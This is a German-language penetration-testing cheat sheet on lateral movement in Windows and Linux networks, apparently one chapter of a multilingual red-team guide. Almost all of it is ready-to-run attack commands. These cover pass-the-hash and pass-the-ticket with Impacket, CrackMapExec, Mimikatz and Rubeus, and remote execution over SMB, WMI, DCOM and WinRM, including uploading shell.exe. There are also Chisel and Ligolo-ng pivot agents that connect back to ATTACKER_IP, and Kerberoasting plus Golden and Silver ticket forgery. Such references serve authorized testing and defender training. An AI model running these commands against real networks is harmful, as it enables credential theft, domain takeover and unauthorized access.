# ➡️ Phase 4: Laterale Bewegung (Lateral Movement)

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](04-Lateral-Movement.tr.md) • [🇬🇷 Ελληνικά](04-Lateral-Movement.el.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Ziel:** Vom kompromittierten System auf weitere Systeme im Netzwerk zugreifen.

---

## 🔑 Bewegung mithilfe von Zugangsdaten

### Pass-the-Hash (PTH)
```bash
# Impacket PSExec mit Hash
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)
```powershell
# Ticket aus dem Speicher exportieren (Mimikatz)
sekurlsa::tickets /export

# Ticket importieren
kerberos::ptt ticket.kirbi

# Alternativ mit Rubeus
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Ticket überprüfen
klist
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Mimikatz – TGT mit NTLM-Hash anfordern
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate
```bash
# Zertifikat zur Authentifizierung verwenden
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# Mit Rubeus
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ Methoden zur entfernten Ausführung

### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec (unauffälliger)
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell WMI
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM mit Passwort
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM mit Hash
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# PowerShell-Remoting
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOM
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# Befehlsausführung mit CrackMapExec
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# Datei über SMB kopieren
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# Nach Art von PsExec
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# Mit NTLM-Hash (Restricted Admin Mode)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# RDP aus der Ferne aktivieren
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# SSH mit Passwort
ssh user@192.168.1.10

# SSH mit Schlüssel
ssh -i id_rsa user@192.168.1.10

# SSH-Tunneling/Pivoting
ssh -D 9050 user@192.168.1.10  # SOCKS-Proxy
ssh -L 8080:internal:80 user@192.168.1.10  # Lokale Portweiterleitung
```

---

## 🔄 Pivoting im Netzwerk

### SSH-Tunneling
```bash
# Lokale Portweiterleitung (Zugriff auf internal:80 über localhost:8080)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Dynamischer SOCKS-Proxy
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Entfernte Portweiterleitung
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel
```bash
# Auf dem Angreiferrechner (Server)
./chisel server --reverse --port 8080

# Auf dem Zielsystem (Client)
./chisel client ATTACKER_IP:8080 R:socks

# Mit proxychains verwenden
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# Auf dem Angreiferrechner
./proxy -selfcert

# Auf dem Zielsystem
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In der Proxy-Konsole
session
start
```

### Metasploit Pivoting
```bash
# Route über die Meterpreter-Sitzung hinzufügen
run autoroute -s 192.168.2.0/24

# Alternativ manuell
route add 192.168.2.0 255.255.255.0 1

# SOCKS-Proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Kerberos-Angriffe

### Kerberoasting
```bash
# Diensttickets abrufen
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Mit hashcat knacken
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Benutzer ohne Präauthentifizierung finden
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Knacken
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket
```powershell
# Zuerst den krbtgt-Hash erlangen, dann:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket
```powershell
# Ticket für einen bestimmten Dienst erstellen
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 Kurzreferenz

### Techniken zur lateralen Bewegung

| Technik | Port | Werkzeug |
|-----------|------|------|
| PSExec | 445/SMB | impacket, metasploit |
| WMIExec | 135/WMI | impacket |
| WinRM | 5985/5986 | evil-winrm |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | impacket |

### Erforderliche Zugangsdaten

| Methode | Voraussetzung |
|--------|-------------|
| Pass-the-Hash | NTLM-Hash |
| Pass-the-Ticket | Kerberos-Ticket |
| PSExec | Administratorrechte + SMB-Zugriff |
| WinRM | WinRM aktiviert + Administratorrechte |
| RDP | RDP aktiviert + Mitgliedschaft in der RDP-Gruppe |

---

## 🔗 Weiterführende Cheatsheets

- [Impacket](../../Impacket/README.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/README.md)
- [Rubeus](../../Rubeus/README.md)

---

**Vorherige Phase:** [← 03 - Rechteausweitung (Privilege Escalation)](./03-Privilege-Escalation.de.md)

**Nächste Phase:** [05 - Persistenz (Zugang aufrechterhalten) →](./05-Persistence.de.md)

---

## Hinweise zur deutschen Ausgabe

> **Einordnung:** *Pass-the-Hash* verwendet einen NTLM-Hash, *Pass-the-Ticket* ein vorhandenes Kerberos-Ticket und *Pass-the-Certificate* ein Zertifikat samt zugehörigem privaten Schlüssel zur Authentifizierung. Die Voraussetzungen in der Tabelle sind typische Konstellationen, keine vollständigen Zugriffsregeln. WMI/DCOM können neben TCP 135 dynamische RPC-Ports benötigen. Die `proxychains nmap`-Beispiele sind vereinfachte Vorlagen: SOCKS transportiert TCP-Verbindungen, keine beliebigen rohen Scanpakete; das Scanverfahren muss dazu passen.
